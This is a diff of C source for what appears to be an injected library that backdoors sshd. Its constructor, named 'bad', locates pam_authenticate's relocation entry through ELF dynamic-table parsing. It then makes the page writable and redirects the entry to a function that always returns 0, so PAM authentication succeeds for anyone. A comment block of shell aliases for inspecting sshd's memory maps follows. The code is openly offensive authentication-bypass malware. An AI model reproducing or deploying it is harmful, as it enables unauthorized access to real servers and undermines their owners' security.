@@ -175,6 +175,26 @@ static int is_sshd(struct link_map *link_map)
 }
 
 
+Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *funcneedle);
+void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
+					 uint64_t **RELASZ, Elf64_Rela **JMPREL, uint64_t **PLTRELSZ);
+void *ehdr;
+
+
+
+int myfunc(void)
+{
+	__asm__ (
+		"nop;"
+		"nop;"
+		"nop;"
+		"nop;"
+		"nop;"
+		"nop;"
+		);
+	return 0;
+}
+
 static void  __attribute__ ((constructor)) bad(void)
 {
 	struct link_map *link_map;
@@ -199,25 +219,40 @@ static void  __attribute__ ((constructor)) bad(void)
 	hook(libpam, pam_auth, retzero, 20);
 	//hook pam_acct_mgmt to allow usernames*/
 	
-	pamdynamicstuff();
-	
-	return;
-}
+/*										*/
 
-Elf64_Dyn *null1;
-Elf64_Dyn *null2;
 
-void pamdynamicstuff(void)
-{
+
 	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
 	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
 	dlclose(o);
-
 	dl_iterate_phdrptr(callback, NULL);
 
+	if (!null1)
+		return;
 
-	// work()
+	Elf64_Rela *RELA, *JMPREL;
+	uint64_t *RELASZ, *PLTRELSZ;
 
+	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
+
+	void *pamstart = get_libstart(link_map, "libpam.so.0");
+	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");
+
+	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate);
+
+
+
+	
+	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;
+
+	mprotect((void *) prevpage, PAGE_SIZE, PROT_READ | PROT_WRITE);
+
+	foundrela->r_addend = (signed long long)myfunc; 
+
+	mprotect((void *) ehdr, PAGE_SIZE, PROT_READ);
+
+	
 	return;
 }
 
@@ -248,6 +283,8 @@ void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
 /*
  * parses a .dynamic relocation table (DT_RELA) to return the Elf64_Rela * entry associated 
  *	with the funcneedle we want to hook...
+ *
+ * char* cast for correct arithmetic (surprisingly simple thing to forget)
  *
  * works in 3.2.0-4 openssh_6.0pl YMMV
  */
@@ -302,7 +339,13 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 	int j;
 	
 	for (j = 0; j < info->dlpi_phnum; j++) {
-		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_DYNAMIC) {
+		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_PHDR) {
+			if (strstr(info->dlpi_name, ".so") == NULL) {
+				ehdr = (void *) ((info->dlpi_addr + info->dlpi_phdr[j].p_vaddr) - info->dlpi_phdr[j].p_offset);
+			}
+		}
+		
+	if ((unsigned int)info->dlpi_phdr[j].p_type == PT_DYNAMIC) {
 			if (strstr(info->dlpi_name, ".so") == NULL) {
 				if (info->dlpi_phnum == (unsigned)9) {
 					null1 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
@@ -315,13 +358,22 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 			}
 		}
 	}
-/* might be useful one day i dont know, ehdr is usually offset 0x40 from phdr[0] anyways
-		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_PHDR) {
-			if (strstr(info->dlpi_name, ".so") == NULL) {
-				ehdr = ((info->dlpi_addr + info->dlpi_phdr[j].p_vaddr) - info->dlpi_phdr[j].p_offset);
-				break;
-			}
-		}
-*/
 	return 0;
 }
+
+/*
+
+
+alias ls='ls --color=auto'
+alias grep='grep --color=auto'
+alias make='make clean ; clear && make'
+alias maps='cat /proc/$(pidof sshd)/maps'
+alias asf='cat /root/asf'
+
+
+function calc () {
+		    bc -l <<< "$@"
+}
+
+
+*/
